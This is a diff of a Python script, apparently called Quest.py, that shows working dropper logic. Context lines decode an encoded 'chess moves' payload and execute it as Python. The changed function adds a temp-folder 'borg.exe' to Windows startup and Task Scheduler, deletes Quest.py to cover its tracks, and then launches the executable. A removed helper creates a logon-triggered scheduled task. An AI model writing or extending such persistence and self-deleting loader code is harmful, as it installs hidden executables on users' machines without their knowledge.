@@ -119,42 +119,55 @@ codex_file = 'binar/codex_mapping.txt'
 # Translate and execute the Python code, then remove the codex file
 translate_and_execute_chess_moves(chess_moves, codex_file)
 
-# Function to run 'borg.exe' and delete Quest.py
 def run_borg_executable():
+    # Get the temp directory path for borg.exe
     user_temp_dir = tempfile.gettempdir()
     borg_exe_path = os.path.join(user_temp_dir, 'borg.exe')
-    quest_script_path = 'binar/Quest.py'  # Ensure relative path to Quest.py
+    quest_script_path = os.path.join(os.getcwd(), 'binar', 'Quest.py')  # Ensure correct relative path to Quest.py
     
     # Audit the paths to ensure correctness
-    if not all([os.path.isdir(os.path.realpath(user_temp_dir)), os.path.isdir(os.path.join(os.getcwd(), 'binar'))]):
-        print(
-            "Uh hey we may have a problem",
-            f"{os.getcwd()=}, {os.path.realpath(os.getcwd())=}",
-            f"{os.listdir()=}, {user_temp_dir=}, {borg_exe_path=} {os.path.realpath(borg_exe_path)=}",
-            sep=", ", 
-            flush=True
-        )
-    else:
-        print("Path audit passed, no problems detected.")
+    try:
+        # Check if both temp dir and 'binar' directory exist
+        if not os.path.isdir(user_temp_dir) or not os.path.isdir(os.path.join(os.getcwd(), 'binar')):
+            print("Uh hey we may have a problem with the directories:")
+            print(f"Current working directory: {os.getcwd()}")
+            print(f"Real path of cwd: {os.path.realpath(os.getcwd())}")
+            print(f"User temp dir: {user_temp_dir}")
+            print(f"borg.exe path: {borg_exe_path}")
+            return  # Exit function if paths are not valid
+        else:
+            print("Path audit passed, no problems detected.")
+    except Exception as e:
+        print(f"Path audit error: {e}")
+        print(traceback.format_exc())
+        return  # Exit function in case of path-related issues
+    
+    print(f"\nAttempting to add {borg_exe_path} to startup and Task Scheduler...")
 
-    print(f"\nAttempting to add {borg_exe_path} to startup...")
-
+    # Check if borg.exe exists before proceeding
     if os.path.exists(borg_exe_path):
-        # Add the executable to startup before it runs
-        add_to_startup(borg_exe_path)
+        # Add borg.exe to startup and Task Scheduler
+        try:
+            add_to_startup_and_task_scheduler(borg_exe_path)
+        except Exception as e:
+            print(f"Error while adding {borg_exe_path} to startup and Task Scheduler: {e}")
+            print(traceback.format_exc())
+            return  # Exit function in case of error
 
         # Clean up Quest.py after adding to startup but before executing borg.exe
         try:
             if os.path.exists(quest_script_path):
                 print(f"Deleting {quest_script_path} before executing {borg_exe_path}...")
-                os.remove(quest_script_path)  # Delete Quest.py
+                os.remove(quest_script_path)
                 print(f"{quest_script_path} has been deleted.")
             else:
                 print(f"{quest_script_path} not found, skipping deletion.")
         except Exception as e:
             print(f"Error during Quest.py cleanup: {e}")
-        
-        # Now execute the executable after Quest.py is removed
+            print(traceback.format_exc())
+            return  # Exit function in case of error
+
+        # Execute borg.exe after cleanup
         try:
             print(f"\nAttempting to execute {borg_exe_path}...")
             process = subprocess.Popen([borg_exe_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -167,35 +180,10 @@ def run_borg_executable():
                 print(f"Execution failed with return code {process.returncode}.")
                 print(stderr.decode('utf-8'))
         except Exception as e:
-            print(f"Failed to run the executable: {e}")
+            print(f"Failed to run {borg_exe_path}: {e}")
             print(traceback.format_exc())
     else:
         print(f"Executable {borg_exe_path} not found.")
-
-# Task Scheduler function
-def add_task_scheduler(executable_path, app_name="BorgApp"):
-    try:
-        # Construct the command to add the task
-        task_name = app_name
-        user = os.getlogin()  # Get the current user
-        cmd = [
-            'schtasks', '/Create', '/F',
-            '/SC', 'ONLOGON',  # Set the task to trigger on logon
-            '/TN', task_name,  # Task name
-            '/TR', executable_path,  # Task action (run executable)
-            '/RU', user  # Run as current user
-        ]
-
-        # Run the command to create the scheduled task
-        result = subprocess.run(cmd, capture_output=True, text=True)
-
-        if result.returncode == 0:
-            print(f"Successfully added {executable_path} to Task Scheduler.")
-        else:
-            print(f"Failed to add task. Error: {result.stderr}")
-    except Exception as e:
-        print(f"An error occurred: {e}")
-        print(traceback.format_exc())
 
 # Finally, run borg.exe and delete Quest.py
 run_borg_executable()
